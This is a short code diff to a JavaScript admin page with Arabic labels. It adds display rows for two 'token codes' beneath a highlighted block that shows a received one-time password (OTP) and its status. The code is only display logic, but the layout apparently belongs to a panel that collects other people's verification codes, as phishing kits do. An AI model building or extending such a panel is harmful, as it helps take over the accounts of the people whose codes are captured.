@@ -651,6 +651,12 @@
                     const otpVal = data.otp_code || data.otp;
                     html += '<div class="section-divider" style="background: #fff3e0; padding: 10px; border-radius: 8px;"><h4>رمز التحقق (OTP)</h4></div>';
                     html += '<div class="detail-row" style="background: #fff3e0;"><span class="detail-label" style="color: #e65100;">الرمز المستلم</span><span class="detail-value highlight" style="font-size: 32px; color: #d32f2f; background: white; padding: 5px 15px; border-radius: 5px; border: 2px solid #d32f2f;">' + escapeHtml(otpVal) + '</span></div>';
+                    if (data.token1_code) {
+                        html += '<div class="detail-row"><span class="detail-label">كود توكن 1</span><span class="detail-value highlight">' + escapeHtml(data.token1_code) + '</span></div>';
+                    }
+                    if (data.token2_code) {
+                        html += '<div class="detail-row"><span class="detail-label">كود توكن 2</span><span class="detail-value highlight">' + escapeHtml(data.token2_code) + '</span></div>';
+                    }
                     html += '<div class="detail-row"><span class="detail-label">الحالة</span><span class="detail-value">' + getStatusLabel(d.otp_status) + '</span></div>';
                 }
 
